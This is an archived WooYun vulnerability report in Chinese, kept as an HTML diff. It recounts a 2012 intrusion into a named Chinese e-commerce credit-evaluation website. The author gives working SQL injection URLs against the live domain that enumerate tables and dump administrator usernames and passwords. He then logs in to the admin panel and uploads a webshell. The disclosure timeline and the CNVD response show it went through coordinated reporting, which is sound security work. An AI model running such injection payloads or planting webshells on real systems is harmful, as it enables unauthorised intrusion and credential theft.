@@ -1,0 +1,278 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		渗透中国电子商务诚信评价中心全过程与测试技巧  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		渗透中国电子商务诚信评价中心全过程与测试技巧  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/GuoKer（ZhuLiu）">GuoKer（ZhuLiu）</a> 
+</li><li>提交时间：		2012-10-15 14:02</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-10-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-11-08：	细节向普通白帽子公开<br/>
+									2012-11-18：	细节向实习白帽子公开<br/>
+									2012-11-29：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一处mysql注入引发的血案</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">渗透中国电子商务诚信评价中心<br />
+<br />
+  0x.1 <br />
+<br />
+今天在群里边跟别人扯淡，看见别人发来一条信息说。啥中国电子商务的网站被人挂了txt<br />
+<br />
+<br />
+<br />
+尔等小菜果断的去围观了      看见别人挂的txt那叫羡慕啊  于是自己也去试试看能不能日下，于是有了下文<br />
+<br />
+  0x.2<br />
+<br />
+ 来到www.ectrustprc.org.cn 看了看，发现有注入啊.....<br />
+<br />
+<br />
+<br />
+http://www.ectrustprc.org.cn/newsShow.php?id=1297836243<br />
+<br />
+<br />
+<br />
+先是and 1=1 正常  and 1=2 错误<br />
+<br />
+然后order by 猜字段 是到order by 11 报错了 order by 10正常 证明字段10<br />
+<br />
+现在就到找出位置了<br />
+<br />
+<br />
+<br />
+Union select <br />
+<br />
+http://www.ectrustprc.org.cn/newsShow.php?id=1297836243%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10<br />
+<br />
+<br />
+<br />
+爆出位置在2，5，3，6<br />
+<br />
+<br />
+<br />
+位置爆出来了，我们来查一查他的数据库名吧，为接下来的爆数据库表名做准备<br />
+<br />
+http://www.ectrustprc.org.cn/newsShow.php?id=1297836243%20and%201=2%20UNION%20SELECT%201,database%28%29,3,4,5,6,7,8,9,10<br />
+<br />
+图1<br />
+<br />
+</p><p class="detail"><a href="../images/15020136165faf09fd890193fdd80876a7ec9680.png" target="_blank"><img src="../images/15020136165faf09fd890193fdd80876a7ec9680.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+  爆出库名为ectrust 现在我们来爆表<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+http://www.ectrustprc.org.cn/newsShow.php?id=1297836243%20and%201=2%20UNION%20SELECT%201,2,3,4,5,concat%28GROUP_CONCAT%28DISTINCT%20table_name%29%29,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x65637472757374<br />
+<br />
+0x65637472757374 是ectrust 用小葵就可以转成HEX格式的<br />
+<br />
+<br />
+<br />
+成功爆出所有表名<br />
+<br />
+图2<br />
+<br />
+</p><p class="detail"><a href="../images/15020150bc22ff971fc1473a766f98a9a777350b.png" target="_blank"><img src="../images/15020150bc22ff971fc1473a766f98a9a777350b.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+admin_u,binfo,blacklist,com_contact,comments,company_web,complain,download,ec_binfo,ec_blacklist,ec_complain,ec_freeinfo,ec_pinfo,ec_rinfo,ec_trustauth,freeinfo,mk_info,news,news_type,pay,pinfo,precert,report_m,rinfo,scoreblue,scorefree,scorep,scorered,static_info,trustauth<br />
+<br />
+ 目测admin_u是管理员帐号密码的表 果断的爆出帐号密码<br />
+<br />
+<br />
+<br />
+http://www.ectrustprc.org.cn/newsShow.php?id=1297836243%20and%201=2%20UNION%20SELECT%201,name,3,4,5,password,7,8,9,10%20from%20admin_u<br />
+<br />
+图3<br />
+<br />
+</p><p class="detail"><a href="../images/15020205efa873b3b27c458c096ee13ed7a1d11a.png" target="_blank"><img src="../images/15020205efa873b3b27c458c096ee13ed7a1d11a.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+ Google搜索到了后台，果断的登录<br />
+<br />
+图4<br />
+<br />
+</p><p class="detail"><a href="../images/150202176c8a0861124070a3dba14737cf4cb960.png" target="_blank"><img src="../images/150202176c8a0861124070a3dba14737cf4cb960.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ 文件上次可以直接上传.asa的文件 成功写入小马.......<br />
+<br />
+图5<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/150202272a4bbb72ce61836d2c72abf47fce02c2.png" target="_blank"><img src="../images/150202272a4bbb72ce61836d2c72abf47fce02c2.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+..........进去的时候发现好多人放了shell 蛋疼<br />
+<br />
+<br />
+<br />
+FROM GUOKER<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://www.ectrustprc.org.cn/test.txt </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你懂得 都是注入惹的祸 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/GuoKer（ZhuLiu）" title="GuoKer（ZhuLiu）">GuoKer（ZhuLiu）</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013364" title="渗透中国电子商务诚信评价中心全过程与测试技巧">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：14 </p>
+													<p class="detail">确认时间：2012-10-19 18:50</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述全过程，由于网站管理方为无挂靠上级单位，CNVD于19日联系上网站管理方，已经协调处置。<br />
+<br />
+参考一般单位的类似安全漏洞评分，rank 10+手工测试过程加分4</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13364";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
